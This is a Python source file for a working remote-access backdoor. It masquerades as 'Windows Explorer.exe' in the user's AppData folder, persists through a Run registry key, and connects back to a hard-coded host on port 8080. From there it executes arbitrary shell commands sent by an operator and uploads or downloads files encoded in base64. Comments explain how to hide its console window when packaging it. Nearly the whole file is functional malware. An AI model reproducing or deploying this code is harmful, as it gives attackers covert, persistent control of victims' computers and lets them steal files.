import subprocess
import json
import os
import base64
import socket
import sys
import shutil
import time

class Backdoor: 
    def __init__(self, ip, port):                                             
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                                                 #Initializing socket. See socket module documentation for more info. For now, this line can be seen as a standard for initializing sockets.
        self.connection.connect((ip, port))
        self.send_results()

    def become_persistent(self):
        file_location =  os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(file_location):
            shutil.copy(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Windows Explorer /t REG_SZ /d "' + file_location + '" --background -V' ,shell=True)


    def execute_system_command(self, command):
        command = ' '.join(map(str, command))

        result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)          #DEVNULL or /dev/null(in linux): Whatever you write to “/dev/null” is discarded, forgotten, thrown into the void. For more info, google it. 
                                                                                                                            #DEVNULL is necessary because --noconsole option on pyinstaller works for pretty much all python programs except the ones that interact with the standard i/o and error(i.e. the console). 
        return result

    def change_working_directory(self, path):
        if(len(path)>1):
            path_string = ' '.join(map(str,path))
        else:
            path_string = ''.join(map(str,path))
        os.chdir(path_string)

        return f"Changing directory to: {path_string}"

    def read_file(self,path):

        if(len(path)>1):
            path_string = ' '.join(map(str,path))
        else:
            path_string = ''.join(map(str,path))
        with open(path_string, "rb") as file:
            return base64.b64encode(file.read())                                                                          #This will encode any unreadable character to base64 so that we can read any file. (instead of utf-8 encoding)        

    def write_file(self, path, content):
        if(len(path)>1):
            path_string = ' '.join(map(str,path))
        else:
            path_string = ''.join(map(str,path))
        
        with open(path, 'wb') as file:
            # content = content.encode('iso-8859-1')
            file.write(base64.b64decode(content))
        return '[+] Upload Successful'       

    def send(self, data):
        json_data = json.dumps(data)
        try:
            self.connection.send(json_data.encode())
        except OSError:
            sys.exit()

    def recieve(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(102400).decode('utf-8')
                return json.loads(json_data)
            except Exception:
                continue

    def send_results(self):
        while True:
            recieved_data = self.recieve()

            try:
                if(recieved_data[0].lower() == "exit"):
                    self.connection.close()
                    sys.exit()
                
                elif recieved_data[0].lower() == "cd" and len(recieved_data) >1:
                    command_result = self.change_working_directory(recieved_data[1:])
                
                elif recieved_data[0].lower() == "download":
                    command_result = self.read_file(recieved_data[1:])
                
                elif recieved_data[0].lower() == "upload":
                    # path_string = "".join(map(str,recieved_data[1]))                           #Converting the list into a string of file's name. 
                    command_result = self.write_file(recieved_data[1], recieved_data[2])
                
                else:
                    command_result = self.execute_system_command(recieved_data)                 #The execute_system_command method still works, because subprocess.check_output can also take a list as arguments. 

            except:
                command_result = "[-] Error during command execution. "

            if(type(command_result) is bytes):
                self.send(command_result.decode('iso-8859-1'))
            else:
                self.send(command_result)

try:
    time.sleep(100)
    backdoor = Backdoor("192.168.1.72", 8080)
    
except Exception:
    sys.exit()